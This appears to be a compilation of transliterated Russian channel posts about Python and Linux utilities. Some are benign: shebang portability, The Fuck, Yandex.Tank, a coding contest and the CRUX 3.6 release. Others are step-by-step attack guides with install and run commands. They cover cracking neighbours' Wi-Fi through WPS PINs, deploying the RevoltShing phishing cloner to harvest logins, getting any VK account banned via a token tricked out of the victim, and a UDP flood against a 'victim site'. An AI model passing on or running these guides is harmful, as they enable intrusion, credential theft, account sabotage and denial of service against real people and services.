#bash #env #chmod #Python #Python3 #sh #zsh #fish  Dzhedai i Sitkhi v skriptakh.   Nemnogo poleznoi teorii.    A na kakoi storone ty?     Po umolchaniiu vse skripty, kotorye sozdaet pol'zovatel', ne iavliaiutsia ispolniaemymi. Poetomu neobkhodimo iavno ukazyvat' etot parametr: chmod +x <filename> Skript konechno mozhno zapustit' i bez nego. Naprimer v obolochke bash (ili sh, zsh, fish...): bash <filename> No kazhdyi raz dopisyvat' v konsoli tu ili inuiu obolochku miagko govoria ne udobno, da i znachitel'no zamedliaet pol'zovatelia. Poetomu luchshe vstavit' v skript stroku s ukazaniem obolochki i sdelat' ego ispolniaemym. Naprimer tak: #!/bin/bash Tem samym my govorim interpretatoru kakuiu programmu vyzvat', esli skript ispolniaemyi. Ili tak: #!/usr/bin/env bash env -- UNIX-utilita, kotoraia pozvoliaet modifitsirovat' spisok peremennykh okruzheniia pered ispolneniem pol'zovatel'skoi komandy s izmeneniem okruzheniia. V nekotorykh komandnykh obolochkakh ona iavliaetsia vstroennoi, v nekotorykh -- vneshnei komandoi. Komandu env inogda ispol'zuiut dlia uluchsheniia perenosimosti skriptov, tak kak put' k interpretatoram v raznykh sistemakh mozhet otlichat'sia, a put' k env odinakovyi v bol'shinstve operatsionnykh sistem. Naprimer, bash: #!/usr/bin/env bash Ili Python3: #!/usr/bin/env python3 Ne garantiruetsia, chto na razlichnykh sistemakh put' k bash budet odinakovym. Ukazyvaia env my zashchishchaem sebia ot takikh neozhidannostei. No eto tol'ko v tom sluchae, esli planiruetsia ispol'zovat' skripty na raznykh sistemakh, komp'iuterakh i t.d. Esli takoi neobkhodimosti net, standartnyi variant otlichno podoidet.  Imenno v etoi melochi i kroetsia d'iavol. Kak uzhe upominalos' v raznykh sistemakh puti k interpretatoram razlichaiutsia. Inogda razlichaiutsia takzhe i imenovaniia samikh interpretatorov.  Naprimer bash vo FreeBSD raspolozhen po puti: /usr/local/bin/bash Togda ispol'zovanie env vpolne opravdano: #!/usr/bin/env bash A Python3 v Windows (eto prosto obolochka MinGW, ili v tom zhe konsol'nom GIT dlia Windows, posle ustanovki Python-a) imenuetsia kak python, a ne python3. T.e. pervaia stroka v skripte dlia GIT-Windows, budet vygliadet' sleduiushchim obrazom: #!/usr/bin/env python Vmesto standartnoi: #!/usr/bin/env python3 Poetomu, pered sozdaniem liubogo skripta bud'te vnimatel'ny v pravil'nosti ukazaniia nuzhnogo vam interpretatora. A luchshe vsego proverit' eto testovym skriptom s odnoi edinstvennoi strokoi vyvoda "Hello World!".   Nu i naposledok. stroku vida: "#!/bin/bash" - budem schitat' tiomnoi storonoi skriptov, t.k. perenosimost' u neio khuzhe vsego. A "#!/usr/bin/env bash" - svetloi. Nu a s vami kak vsegda byl Shadow. Podpisyvaites' na gruppu VKontakte, stav'te laiki, kommentiruite. Vsem Dobra i Udachi!

Scanning APK file for URIs, endpoints & secrets.InstallationTo install apkLeaks, simply:  $ git clone https://github.com/dwisiswant0/apkleaks$ cd apkleaks/$ pip install -r requirements.txt  Or download at release tab.  Dependencies  This package works in Python2 (not Python3).Install global packages:  Linux  $ sudo apt-get install libssl-dev swig -y  OSX$ brew install openssl swig  WindowsYou need to install:    UsageBasically,  $ python apkleaks.py -f ~/path/to/file.apk  Optionsusage: apkleaks [-h] -f FILE [-o OUTPUT] [-p PATTERN]optional arguments:-h, --help            show this help message and exit-f FILE, --file FILE  APK file to scanning-o OUTPUT, --output OUTPUTWrite to file results (NULL will be saved into randomfile)-p PATTERN, --pattern PATTERNPath to custom patterns JSON  In general, if you don't provide -o argument, then it will generate results file automatically.  Custom patterns can be added with the following flag --pattern /path/to/rules.json to provide sensitive search rules in the JSON file format... #androidsecurity #apkleaks #mobilesecurity #python #python2 #reverseengineering #scanningapk #staticanalysis

Vulmap - eto instrument skanirovaniia uiazvimostei, kotoryi mozhet skanirovat' na nalichie uiazvimostei v veb-konteinerakh, veb-serverakh, promezhutochnom veb-programmnom obespechenii, a takzhe v CMS i drugikh veb-programmakh, a takzhe imeet funktsii ekspluatatsii uiazvimostei. Sootvetstvuiushchie testirovshchiki mogut ispol'zovat' vulmap, chtoby opredelit', est' li u tseli konkretnaia uiazvimost', i mogut ispol'zovat' funktsiiu ekspluatatsii uiazvimosti, chtoby proverit', sushchestvuet li uiazvimost' na samom dele.  V nastoiashchee vremia Vulmap imeet rezhimy skanirovaniia uiazvimostei (poc) i ekspluatatsii (exp). Ispol'zuite <<-m>>, chtoby vybrat', kakoi rezhim ispol'zovat', i po umolchaniiu ispol'zuetsia rezhim poc. V rezhime poc on takzhe podderzhivaet skanirovanie tselevogo paketa "-f", rezul'taty vyvoda faila "-o" i drugie osnovnye funktsii, drugie funktsii Parametry ili python3 vulmap.py -h, funktsiia Poc bol'she ne budet predostavliat'sia v eksploite. rezhim, no eksploit budet vypolnen napriamuiu, a rezul'tat eksploita budet vozvrashchen dlia dal'neishei proverki nalichiia uiazvimosti i vozmozhnosti ee ispol'zovaniia.

Vulmap is a vulnerability scanning tool that can scan for vulnerabilities in Web containers, Web servers, Web middleware, and CMS and other Web programs, and has vulnerability exploitation functions.Relevant testers can use vulmap to detect whether the target has a specific vulnerability, and can use the vulnerability exploitation function to verify whether the vulnerability actually exists.Vulmap currently has vulnerability scanning (poc) and exploiting (exp) modes. Use "-m" to select which mode to use, and the default poc mode is the default. In poc mode, it also supports "-f" batch target scanning, "-o" File output results and other main functions, Other functions Options Or python3 vulmap.py -h, the Poc function will no longer be provided in the exploit exploit mode, but the exploit will be carried out directly, and the exploit result will be fed back to further verify whether the vulnerability exists and whether it can be exploited.Try to use "-a" to establish target types to reduce false positives, such as "-a solr"InstallationThe operating system must have python3, python3... #elasticsearch #jboss #linux #macos #remotecodeexecution..

Kak vzlomat' Wi-Fi za 5 minut s pomoshch'iu python!   V chiom sut'? Starye routery generiruiut PIN CODE na osnove MAC adresa, imenno etu uiazvimost' my i budem ekspluatirovat'. Pliusy, nam nado perebrat' vsego desiatok pin-kodov, a ne sotni tysiach. Minusy, routery mogut byt' obnovleny! Budu rassmatrivat' dva varianta:  Pervyi s Kali Linux:     pip3 install wpspin              airmon-ng start wlan0              airodump-ng wlan0 ili airodump-ng wlan0mon  Nazhimaem CTRL + Z, vse tochki dostupa na ladoni. Nam nuzhen lish' MAC-adres tochki kotoruiu my khotim atakovat', ne zabud'te posmotret' vkliuchen li u neio WPS. Zapuskaem soft ukazyvaia MAC, setevuiu kartu, taimaut;  python3 hack.py 00:00:00:00:00:00 wlan0 20  Dalee prosto meniaem MAC i zhdiom kogda vzlomaem kakoi-to iz routerov!  Vtoroi variant (dlia termux-khakerov):  apt update && apt -y install python pip install wpspin wpspin -A MAC-adres   Chtoby sdelat' takoe na Android, prostye programmy WPS est' kotorye podkliuchatsia po listu pin-kodov.   VAZhNO! Ne kazhdyi router uiazvim, no mnogo Wi-Fi kotorye mozhno vzlomat'. Vo krug menia bolee 20 Wi-Fi tochek, i 14 iz nikh s WPS.  Kazhdyi 3 router mozhet byt' uiazvim.

Yandex.Tank  Yandex.Tank - open source programma dlia nagruzochnogo testirovaniia, napisannaia na Python3. Proshche vsego zapustit' ego cherez Docker. V Tanke vy smozhete symitirovat' pravdopodobnuiu nagruzku na testiruemyi servis pri pomoshchi odnogo iz neskol'kikh generatorov nagruzki: phantom ot Iandeksa na C++, izvestnyi Jmeter, BFG ili pandora. Dlia bekenda analitiki ispol'zuetsia Overload.   S pomoshch'iu Yandex.Tank mozhno otnositel'no legko polozhit' nepodgotovlennyi sait. S ego pomoshch'iu vy smozhete naiti na saite medlennye mesta (naprimer, poisk ili bol'shoi katalog). Dlia DDoS luchshe ne ispol'zovat', est' sposoby deshevle. Tank pomozhet vam proverit' zashchitu ot nebol'shikh atak. Dlia etogo mozhno ispol'zovat' standartnye vozmozhnosti nginx, iptables, fail2ban ili bolee nakruchennykh programm. Udivitel'no, no ochen' mnogo kto etogo ne delaet.  Ssylki na razroznennye istochniki informatsii o tekhnologii:  - Dokumentatsiia - https://yandextank.readthedocs.io/ - Iskhodniki - https://github.com/yandex-load/yandex-tank - Servis vizualizatsii - https://overload.yandex.net/  #testirovanie #nagruzochnoe #ddos #sysadmin

RevoltShing - eto odin iz takikh instrumentov, on mozhet skopirovat' absoliutno liuboi sait/servis/portal, imeet vstroennuiu funktsiiu perenapravleniia posle vvoda dannykh avtorizatsii na original'nuiu stranitsu skopirovannogo saita.  Ustanovka v Termux:  pkg install git && git clone https://github.com/AngelSecurityTeam/RevoltShing && cd RevoltShing && pkg install python -y && pip3 install wget && pkg install wget && pip3 install bs4 && pip3 install requests && python3 Server.py && python3 revoltshing.py  Etoi bol'shoi komandoi my ustanovili vse zavisimosti i zapustili utilitu  Kak iuzat':  Pered vami poiavitsia konsol', gde sistema po standartu predlozhit klonirovat' sait Banka Ameriki.  Pomeniat' nastroiki mozhno komandoi  edit url https://<stranitsa avtorizatsii nuzhnogo resursa>  Perenapravlenie meniaetsia komandoi  edit url_destination https://<kuda napravit' pol'zovatelia posle vvoda dannykh>  Dlia starta prosto vpisyvaem  start  Gotovo. Vot tak prosto, bez znanii iazykov programmirovaniia, vozmozhno sozdat' fishingovyi sait absoliutno liubogo resursa

Banim akkaunty VKontakte  V etoi stat'e my budem pol'zovat'sia utilitoi FAST BAN, kotoraia zapuskaet mnogo zaprosov na vkhod cherez API, chto, skoree, daet ban navsegda. Esli proiskhodit vremennaia blokirovka, to posle razblokirovki zapuskaem snova i permanent obespechen.  Sut' Dlia nachala nam nuzhno zaiti v Termux i vvesti sleduiushchuiu komandu: pkg install python3 Posle togo, kak nash paiton ustanovilsia, my ustanavlivaem git: pkg install git Dalee ustanavlivaem biblioteki: pip install vk_api pip install requests pip install colorama Esli vy sdelali eti deistviia, vam neobkhodimo klonirovat' repozitorii na svoio ustroistvo: git clone https://github.com/darkcoding12/FAST-BAN Chtoby zapustit' skript, propisyvaem v konsoli eto: cd FAST-BAN python fastban.py Dlia togo, chtoby zabanit' liubogo iuzera VKontakte, vam neobkhodimo vstavit' ego token v pole dlia vvoda. Akkaunt zabanitsia cherez 5-15 sekund.  Kak poluchit' token? Vashei zhertve neobkhodimo uznat' svoi token cherez etot sait: https://vkhost.github.io.

The Fuck - Intellektual'naia korrektor opechatok komand v Linux  Deistvie programmy s lirichnym nazvaniem The Fuck pokhozhe na volshebstvo: pol'zovatel' nabiraet komandu v terminale, no, dopustim, delaet oshibku. Naprimer, zabyvaet pripisat' sudo ili delaet opechatku. Togda on pishet v komandnoi stroke slovo fuck i programma vsio ispravliaet.  Primer raboty programmy-korrektora The Fuck $ apt-get install vim E: Could not open lock file /var/lib/dpkg/lock - open (13: Permission denied) E: Unable to lock the administration directory (/var/lib/dpkg/), are you root?  $ fuck sudo apt-get install vim  The Fuck ponimaet i optsii uzkospetsializirovannykh programm. Vot primer dlia Git:  $ git brnch git: 'brnch' is not a git command. See 'git --help'.  $ fuck $ git branch  Ustanovka The Fuck Ustanovka osushchestvliaetsia cherez paketnyi menedzher PIP -- shtatnyi menedzher dlia upravleniia paketami na Python:  sudo apt update sudo apt install python3-dev python3-pip sudo -H pip3 install thefuck  Poskol'ku programma stavitsia v obkhod sistemnogo paketnogo menedzhera, to i obnovlenie budet vygliadet' neskol'ko inache:  sudo pip install thefuck --upgrade  Kak rabotaet Na samom dele, nikakogo volshebstva. Programma beret soobshchenie ob oshibke posle vvoda predydushchei komandy i pytaetsia sopostavit' s zaranee napisannym obraztsom. Esli sootvetstvie naideno, srabatyvaet pravilo i komanda korrektiruetsia. Khotia pravil napisano uzhe ochen' mnogo, pol'zovateliu ostavili vozmozhnost' dopisyvat' svoi sobstvennye.  P.S. Na Ubuntu./Mint khotia ona i est' v repozitoriiakh odnako pravilo po sudo ubrali iz za vozmozhnykh problem bezopasnosti takzhe izmenilos' napisanie  user@pc1:~$ thefuck syantpic synaptic [enter/|/|/ctrl+c] synaptic user@pc1:~$   https://liberatum.ru/e/the-fuck-mistype-corrector-linux

Nachinaiushchie. Distantsionnoe zaniatie sr 16.12 16:30  Na segodniashnem zaniatii povtoriaem samye chasto ispol'zuemye komandy Python, kotorye my uspeli proiti v etom godu. Prilozhennyi fail - shpargalka po etim komandam. Mozhete pol'zovat'sia ei na sleduiushchikh zaniatiiakh, esli chto-to zabudete.  Segodniashnee zadanie - prochitat' shpargalku, zapustit' primery koda samostoiatel'no v servise repl i zadat' voprosy, esli poiaviatsia.  https://repl.it/languages/python3  Zhelatel'no prochitat' etot fail do zavtrashnego zaniatiia.

Itak, konkurs!      My predlagaem vam razrabotat' tekstovuiu igru s ispol'zovaniem python3. V igre ne dolzhno byt' grafiki, igra dolzhna vzaimodeistvovat' s pol'zovatelem. Zhanr igry ne ogranichen. Eto mozhet byt' i chto-to tipa knigi-igry, gde siuzhet zavisit ot deistvii pol'zovatelia, eto mozhet byt' i realizatsiia nastol'noi igry, a mozhet byt' i kombinatsiia etikh zhanrov - vsio zavisit tol'ko ot vashei fantazii.  Vremia priioma rabot: do 10 ianvaria.  Otsenka budet skladyvat'sia v ravnoi proportsii iz otsenki zhiuri i golosovaniia uchastnikov. Otsenka zhiuri budet provodit'sia po sleduiushchim kriteriiam: - original'nost' (0-4) - ne original'no - - - original'no - tekhnologichnost' (0-3) - po ballu za vkliuchenie readme, requirements.txt, za github/gitlab zagruzku. - tekhnichnost' (0-12) - bally za ispol'zovanie funktsii (0-1), uslovii (0-1), tsiklov (0-1), klassov (0-1), vvoda pol'zovatelia(0-1), za osmyslennoe naimenovanie peremennykh(0-1), za adekvatnye kommentarii (0-2), za obrabotku iskliuchenii i vvoda pol'zovatelia (0-3), za sootvetstvie pep8 (0-1). - korrektnost' koda (0-2) - bagi sushchestvenno ukhudshaiut igrabel'nost' (+0), bagi lish' izredka vliiaiut na igrovoi protsess (+1), bagi ne vliiaiut na igrovoi protsess/ne vstrecheny (+2).  Raboty prinimaiutsia ssylkami cherez lichnye soobshcheniia gruppy, zhelatel'no ssylkoi na github/gitlab/bitbucket repozitorii. Uchastvovat' mogut pol'zovateli iz Rossii, Belorussii, Ukrainy i drugikh stran SNG.   Priz za pervoe mesto - kniga na vybor: Python dlia slozhnykh zadach. Nauka o dannykh i mashinnoe obuchenie | Vander Plas Dzh. Sekrety Python. 59 rekomendatsii po napisaniiu effektivnogo koda | Slatkin Brett Put' Python. Chernyi poias po razrabotke, masshtabirovaniiu, testirovaniiu i razvertyvaniiu | Danzhu Dzhul'en  P. S. Do 10 ianvaria my popytaemsia opublikovat' materialy, kotorye pomogut poniat', kak sozdavat' repozitorii, zachem nuzhen requirements.txt i t.d.  #Konkurs_UchimPython2021

Sbor informatsii o instagram akkaunte v Termux  Instrument Instagram OSINT poluchaet iz uchetnoi zapisi Instagram razlichnuiu informatsiiu, kotoruiu vy obychno ne mozhete poluchit', prosto prosmotrev ikh profil'.  Informatsiia vkliuchaet: [profil']: identifikator pol'zovatelia, podpischiki / podpischiki, kolichestvo zagruzok, URL-adres img profilia, biznes-perechislenie, vneshnii URL-adres, nedavno prisoedinilsia i t. d.  [tegi i upominaniia]: naibolee chasto ispol'zuemye kheshtegi i upomianutye akkaunty.  [elektronnaia pochta]: esli kakoi-libo adres elektronnoi pochty ispol'zuetsia v liubom meste, gde on budet otobrazhat'sia  [soobshcheniia]: zagolovok dostupnosti, mestopolozhenie, otmetka vremeni, zagolovok, URL izobrazheniia i t. d.  (no ne rabotaet pravil'no s postami Instagram, pomechennymi kak `` chuvstvitel'nyi kontent '')  Informatsiia, soderzhashchaiasia v dannom rukovodstve dlia obrazovatel'nykh i informatsionnykh tselei, ispol'zuite eio na svoi strakh i risk. My ne nesem nikakoi otvetstvennost' za vashi deistviia.  Obnovim pakety: apt update apt upgrade  Dalee git i python apt install git apt install python  ustanovim repozitorii git clone https://github.com/th3unkn0n/osi.ig.git && cd osi.ig  Posle python3 -m pip install requirements.txt  Primenenie python3 main.py -u username python3 main.py -h -p, --post images info highlight Konets!

DDOS cherez TCP-UDP-Flood    V dannom poste my pogovorim o tom, kak pri pomoshchi Termux i odnogo interesnogo skripta provesti DDOS-ataku saita.    Ataka budet zakliuchatsia v spame UPD-paketov na nomera portov udalionnogo khosta.    Pristupim:    1. Pervym delom otkryvaem Termux i ustanavlivaem git i python:  apt install git python  2. Posle etogo kloniruem repozitorii i otkryvaem papku:  git clone https://github.com/Leeon123/TCP-UDP-Flood.git && cd TCP-UDP-Flood.git  3. Dlia ispol'zovaniia vvodim sleduiushchuiu komandu:  python3 flood.py  4. U nas poiavitsia okoshechko, kotoroe nuzhno zapolnit':  Vvodim v host/ip khost ili IP nashego zhertvy-saita  V port ukazyvaem otkrytyi port 443 ili 80  V grafe s UPD pishem y esli est' port s otkrytym upd, a esli net, to pishem n  V Packets per one connection ukazyvaem kolichestvo paketov v tsifrakh  I v Threads ukazyvaem to, chto budet v zagolovkakh, tozhe v tsifrakh.  5. Zapuskaem i naslazhdaemsia protsessom. ;)

CSCAN - skaner uiazvimostei web-prilozhenii  Utilita CSCAN razrabotana dlia skanirovaniia seti po ee maske i/ili domenu.    Dannaia utilita mozhet pokazat' otkrytye porty i chto imenno upravliaet khostingom. Da, konechno ona ne zamenit skaner uiazvimostei Nmap, no esli ostal'nye skanery veb prilozhenii molchat, danaia utilita vpolne sebe mozhet Vas vyruchit'  Ustanovka:   Skachivaem utilitu: $ git clone https://github.com/j3ers3/Cscan.git  Perekhodim v direktoriiu: $ cd Cscan   Daiom polnyi dostup: $ chmod +x cscanV2.py cscanV1.py   Ustanovim nuzhnye komponenty: $ pip3 install -r requirements.txt   Vyzvat' spravku utility: $ python3 cscanV2.py -h komanda spravki   Skanirovanie podseti po maske:  $ python3 cscanV2.py -i ip_adres/24 -t 100   Skanirovanie spiska domenov:  $ python3 cscanV2.py -f domains.txt -t 100  #it #linux #termux #save

Vse topovye iazyki programmirovaniia uzhe davno dokazali svoi pozitsii i <<opredelilis'>> s nishami svoego ispol'zovaniia.

Vyshel CRUX 3.6

Posle polutora let razrabotki podgotovlen reliz nezavisimogo legkovesnogo Linux-distributiva CRUX 3.6, razvivaemogo s 2001 goda v sootvetstvii s kontseptsiei KISS (Keep It Simple, Stupid) i orientirovannogo na opytnykh pol'zovatelei. Tsel'iu proekta iavliaetsia sozdanie prostogo i prozrachnogo dlia pol'zovatelei distributiva, osnovannogo na BSD-podobnykh skriptakh initsializatsii, imeiushchego maksimal'no uproshchionnuiu strukturu i soderzhashchego otnositel'no nebol'shoe chislo gotovykh binarnykh paketov. CRUX podderzhivaet sistemu portov, pozvoliaiushchuiu legko ustanavlivat' i obnovliat' prilozheniia v stile FreeBSD/Gentoo. Razmer iso-obraza, podgotovlennogo dlia arkhitektury x86-64, sostavliaet  819MB.
Vyshel CRUX 3.6
CRUX 3.6   #LINUX_ORG_RU  Vyshel CRUX 3.6 Zavisimosti glibc teper' ispol'zuiut python3. Sam python3 perekocheval iz vetki OPT v CORE pakety. Iz glibc vyrezany zavisimosti rpc i nls i...

Vyshel CRUX 3.6 Zavisimosti glibc teper' ispol'zuiut python3. Sam python3 perekocheval iz vetki OPT v CORE pakety. Iz glibc vyrezany zavisimosti rpc i nls i vyvedeny v otdel'nye pakety: libnsl i rpcsvc-proto. Pereimenovany pakety Mesa3d v Mesa, openrdate v rdate, jdk v jdk8-bin. Chtoby privlech' bol'she vnimaniia, alias fail dlia prt-get byl perenesion v /etc. Versii paketov po umolchaniiu: glibc 2.32, gcc 10.2.0 i binutils 2.35.1, llvm 11.0.0-1 Xorg 7.7 i xorg-server 1.20.9 polnyi spisok Teper' predlagaemoe iadro - 5.4.80(LTS), no, kak vsegda, mozhno vybrat' liuboe. Po umolchaniiu rekomenduetsia provodit' obnovlenie s nulia, tak kak  vazhnye pakety s novymi versiiami lomaiut sovmestimost' ABI.                      crux
